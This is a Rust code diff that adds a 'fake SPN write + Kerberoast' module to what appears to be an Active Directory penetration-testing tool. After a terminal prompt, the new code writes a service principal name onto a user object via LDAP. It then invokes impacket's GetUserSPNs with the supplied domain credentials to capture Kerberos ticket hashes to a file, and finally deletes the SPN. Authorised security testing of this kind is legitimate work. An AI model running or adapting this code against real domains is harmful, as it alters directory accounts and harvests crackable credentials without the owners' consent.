@@ -1,12 +1,16 @@
 use anyhow::Result;
 use ldap3::controls::RawControl;
-use ldap3::{LdapConnAsync, Scope, SearchEntry};
+use ldap3::{LdapConnAsync, Mod, Scope, SearchEntry};
 use serde::Serialize;
+use std::collections::HashSet;
 use std::env;
 use std::fs;
+use std::io::{self, IsTerminal, Write};
 use std::io::ErrorKind;
 use std::path::PathBuf;
+use std::time::{SystemTime, UNIX_EPOCH};
 use tokio::process::Command;
+use tokio::time::{timeout, Duration};
 
 use crate::output;
 
@@ -242,6 +246,20 @@ pub async fn run(
     if auth_tag_selected(selected_tags, "raisechild") {
         attempt_raisechild(target, domain, username, password, &mut result.findings).await;
     }
+    if auth_tag_selected(selected_tags, "kerberoast")
+        && spn_write_abuse_candidate(&result.findings)
+    {
+        maybe_prompt_fake_spn_roast(
+            &mut ldap,
+            target,
+            domain,
+            username,
+            password,
+            &base_dn,
+            &mut result.findings,
+        )
+        .await?;
+    }
 
     output::info(&format!(
         "Authenticated findings generated: {}",
@@ -250,6 +268,189 @@ pub async fn run(
 
     let _ = ldap.unbind().await;
     Ok(result)
+}
+
+fn spn_write_abuse_candidate(findings: &[AuthFinding]) -> bool {
+    findings.iter().any(|f| {
+        matches!(
+            f.id.as_str(),
+            "AUTH-PRIV-ROUTES" | "AUTH-DACLREAD-DOMAIN" | "AUTH-DCSYNC-HEURISTIC"
+        )
+    })
+}
+
+fn normalize_sam(username: &str) -> String {
+    if let Some((left, _)) = username.split_once('@') {
+        return left.to_string();
+    }
+    if let Some((_, right)) = username.split_once('\\') {
+        return right.to_string();
+    }
+    username.to_string()
+}
+
+fn confirm_fake_spn_attempt() -> bool {
+    if !io::stdin().is_terminal() {
+        return false;
+    }
+    print!("  [*] Potential SPN write abuse path detected. Attempt fake SPN write + roast? [y/N]: ");
+    let _ = io::stdout().flush();
+    let mut line = String::new();
+    if io::stdin().read_line(&mut line).is_err() {
+        return false;
+    }
+    matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes")
+}
+
+fn read_hash_preview(path: &str, limit: usize) -> Option<String> {
+    let content = fs::read_to_string(path).ok()?;
+    let lines = content
+        .lines()
+        .map(str::trim)
+        .filter(|l| !l.is_empty())
+        .map(ToOwned::to_owned)
+        .collect::<Vec<_>>();
+    if lines.is_empty() {
+        return None;
+    }
+    if lines.len() <= limit {
+        return Some(lines.join(" | "));
+    }
+    let mut out = lines[..limit].join(" | ");
+    out.push_str(" | <snip>");
+    Some(out)
+}
+
+async fn maybe_prompt_fake_spn_roast(
+    ldap: &mut ldap3::Ldap,
+    target: &str,
+    domain: &str,
+    username: &str,
+    password: &str,
+    base_dn: &str,
+    findings: &mut Vec<AuthFinding>,
+) -> Result<()> {
+    if !confirm_fake_spn_attempt() {
+        output::info("Skipped fake SPN write abuse attempt");
+        return Ok(());
+    }
+
+    let sam = normalize_sam(username);
+    let user_filter = format!("(&(objectClass=user)(sAMAccountName={}))", sam);
+    let query = ldap
+        .search(base_dn, Scope::Subtree, &user_filter, vec!["distinguishedName"])
+        .await?;
+    let (entries, _) = query.success()?;
+    if entries.is_empty() {
+        output::warning("Could not resolve LDAP user object for fake SPN attempt");
+        return Ok(());
+    }
+    let user_dn = SearchEntry::construct(entries[0].clone()).dn;
+
+    let stamp = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0);
+    let fake_spn = format!("aydee/{sam}-{stamp}");
+
+    let mut add_vals: HashSet<&str> = HashSet::new();
+    add_vals.insert(fake_spn.as_str());
+    let add_res = ldap
+        .modify(
+            &user_dn,
+            vec![Mod::Add("servicePrincipalName", add_vals)],
+        )
+        .await;
+    match add_res {
+        Ok(r) if r.rc == 0 => {
+            output::success(&format!("Fake SPN written on {}: {}", sam, fake_spn));
+        }
+        Ok(r) => {
+            output::warning(&format!(
+                "SPN write denied/failed (rc={}) — skipping fake SPN roast",
+                r.rc
+            ));
+            return Ok(());
+        }
+        Err(e) => {
+            output::warning(&format!(
+                "SPN write failed ({}) — skipping fake SPN roast",
+                e
+            ));
+            return Ok(());
+        }
+    }
+
+    let output_file = "kerberoast_fake_spn_hashes.txt";
+    let bins = ["GetUserSPNs.py", "impacket-GetUserSPNs"];
+    let mut roast_preview = None;
+    let mut tool_used = None;
+
+    for bin in bins {
+        let mut cmd = Command::new(bin);
+        cmd.arg("-request")
+            .arg("-request-user")
+            .arg(&sam)
+            .arg("-dc-ip")
+            .arg(target)
+            .arg("-outputfile")
+            .arg(output_file)
+            .arg(format!("{}/{}:{}", domain, username, password));
+
+        match timeout(Duration::from_secs(60), cmd.output()).await {
+            Ok(Ok(out)) if out.status.success() => {
+                roast_preview = read_hash_preview(output_file, 5);
+                tool_used = Some(bin.to_string());
+                break;
+            }
+            Ok(Ok(_)) => continue,
+            Ok(Err(_)) => continue,
+            Err(_) => {
+                output::warning(&format!("{} timed out during fake SPN roast request", bin));
+            }
+        }
+    }
+
+    let mut del_vals: HashSet<&str> = HashSet::new();
+    del_vals.insert(fake_spn.as_str());
+    let del_res = ldap
+        .modify(&user_dn, vec![Mod::Delete("servicePrincipalName", del_vals)])
+        .await;
+    match del_res {
+        Ok(r) if r.rc == 0 => {
+            output::success("Fake SPN cleanup completed");
+        }
+        _ => {
+            output::warning(&format!(
+                "Failed to clean fake SPN automatically: {} (remove manually from {})",
+                fake_spn, sam
+            ));
+        }
+    }
+
+    if let Some(preview) = roast_preview {
+        output::success("Fake SPN roast succeeded");
+        output::kv("Fake SPN Hashes", &preview);
+        findings.push(AuthFinding {
+            id: "AUTH-FAKE-SPN-WRITE-ROAST".to_string(),
+            severity: "critical".to_string(),
+            title: "Fake SPN write + Kerberoast succeeded".to_string(),
+            evidence: format!(
+                "Target user={} | Fake SPN={} | Tool={} | Output={} | {}",
+                sam,
+                fake_spn,
+                tool_used.unwrap_or_else(|| "<unknown>".to_string()),
+                output_file,
+                preview
+            ),
+            recommendation: "Restrict SPN write rights (validated write / write servicePrincipalName), rotate affected credentials, and review ACL delegation."
+                .to_string(),
+        });
+    } else {
+        output::warning("Fake SPN was written but no Kerberoast hash was captured");
+    }
+
+    Ok(())
 }
 
 async fn collect_usernames(ldap: &mut ldap3::Ldap, base_dn: &str) -> Result<Vec<String>> {
